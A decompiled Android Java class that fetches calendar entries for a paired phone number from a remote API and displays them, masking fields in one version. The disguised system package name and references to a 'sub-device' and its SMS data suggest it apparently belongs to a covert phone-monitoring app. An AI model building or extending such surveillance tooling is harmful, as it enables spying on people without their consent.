package com.android.service.view;

import android.content.Context;
import android.util.Log;
import com.android.service.XmppService;
import com.xmpp.client.util.HttpClinentModle;
import com.xmpp.client.util.PushDialogModle;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CalendarDataBean {
    List<String> ID_list;
    List<String> beginString_list;
    private Context ctx;
    List<String> description_list;
    List<String> endString_list;
    List<String> eventLocation_list;
    private HttpClinentModle hcm = new HttpClinentModle(this.ctx);
    List<String> items_list;
    private List<String> list;
    private List<String> list2;
    private List<String> listtime;
    private PushDialogModle pdm = new PushDialogModle(this.ctx);
    private String strSelect_Pairnum;
    private String strVersion;
    List<String> title_list;

    public CalendarDataBean(Context context, String Version, String Select_Pairnum) {
        this.ctx = context;
        this.strVersion = Version;
        this.strSelect_Pairnum = Select_Pairnum;
    }

    public void UpdataJason(String strHostname) {
        JsonParser(this.hcm.HttpClinentJason("http://" + strHostname + "/API/GetCalendar.ashx?phonenum=" + this.strSelect_Pairnum));
        CalendarViewActivity.calendar_lv.setAdapter(new CalendarAdapter(this.ctx, this.items_list, this.title_list, this.eventLocation_list, this.description_list, this.ID_list, this.beginString_list, this.endString_list));
    }

    private void JsonParser(String strJason) {
        this.items_list = new ArrayList();
        this.title_list = new ArrayList();
        this.eventLocation_list = new ArrayList();
        this.description_list = new ArrayList();
        this.ID_list = new ArrayList();
        this.beginString_list = new ArrayList();
        this.endString_list = new ArrayList();
        try {
            JSONObject json = new JSONObject(strJason);
            if (json.getString("success").equalsIgnoreCase("true")) {
                String strtime = json.getString("AddTime");
                JSONArray nameList = json.getJSONArray(Data.ELEMENT_NAME);
                CalendarViewActivity.calendar_update_time.setText(strtime);
                if (nameList.length() > 0) {
                    for (int i = 0; i < nameList.length(); i++) {
                        Log.d("debugTest", Integer.toString(i));
                        StringTokenizer stringTokenizer = new StringTokenizer(nameList.getJSONObject(i).getString("str"), XmppService.strCheckTag);
                        String smssub1 = "";
                        String smssub2 = "";
                        String smssub3 = "";
                        String smssub4 = "";
                        String smssub5 = "";
                        String smssub6 = "";
                        int n = 0;
                        while (stringTokenizer.hasMoreElements()) {
                            if (n == 0) {
                                smssub1 = stringTokenizer.nextToken();
                            } else if (n == 1) {
                                smssub2 = stringTokenizer.nextToken();
                            } else if (n == 2) {
                                smssub3 = stringTokenizer.nextToken();
                                Log.d("debugTest", smssub3);
                            } else if (n == 3) {
                                smssub4 = stringTokenizer.nextToken();
                            } else if (n == 4) {
                                smssub5 = stringTokenizer.nextToken();
                            } else {
                                smssub6 = stringTokenizer.nextToken();
                            }
                            n++;
                        }
                        Log.d("strVersion==>", this.strVersion);
                        System.out.println("strVersion==>" + this.strVersion);
                        if (smssub2 != null && smssub2.length() > 0) {
                            if (this.strVersion.equalsIgnoreCase("1")) {
                                this.ID_list.add(smssub1);
                                this.items_list.add(smssub2);
                                this.title_list.add(smssub2);
                                this.description_list.add(smssub3);
                                this.beginString_list.add(smssub4);
                                this.endString_list.add(smssub5);
                                this.eventLocation_list.add(smssub6);
                            } else {
                                if (smssub2.length() > 3) {
                                    smssub2 = smssub2.replaceAll(smssub2.substring(3, smssub2.length()), "xxxxx");
                                } else {
                                    smssub2 = smssub2.replaceAll(smssub2.substring(0, 1), "xx");
                                }
                                if (smssub3.length() > 5) {
                                    smssub3 = smssub3.replaceAll(smssub3.substring(5, smssub3.length()), "xxxxxxx");
                                } else {
                                    smssub3 = smssub3.replaceAll(smssub3.substring(0, 2), "xxxxx");
                                }
                                if (smssub4.length() > 7) {
                                    smssub4 = smssub4.replaceAll(smssub4.substring(7, smssub4.length()), "-xx xx:xx:xx");
                                } else {
                                    smssub4 = smssub4.replaceAll(smssub4, "xxxxxxx");
                                }
                                if (smssub5.length() > 7) {
                                    smssub5 = smssub5.replaceAll(smssub5.substring(7, smssub5.length()), "-xx xx:xx:xx");
                                } else {
                                    smssub5 = smssub5.replaceAll(smssub5, "xxxxxxx");
                                }
                                if (smssub6.length() > 2) {
                                    smssub6 = smssub6.replaceAll(smssub6.substring(2, smssub6.length()), "xxxx");
                                } else {
                                    smssub6 = smssub6.replaceAll(smssub6.substring(0, 1), "xxx");
                                }
                                this.ID_list.add(smssub1);
                                this.items_list.add(smssub2);
                                this.title_list.add(smssub2);
                                this.description_list.add(smssub3);
                                this.beginString_list.add(smssub4);
                                this.endString_list.add(smssub5);
                                this.eventLocation_list.add(smssub6);
                            }
                        }
                    }
                    return;
                }
                this.pdm.PushAlertSingleButton("訊息通知", "子機目前無簡訊資料!!");
                return;
            }
            this.pdm.PushAlertSingleButton("伺服器訊息", json.getString("reason"));
        } catch (JSONException e) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e)).toString());
        } catch (Exception e2) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e2)).toString());
        }
    }
}
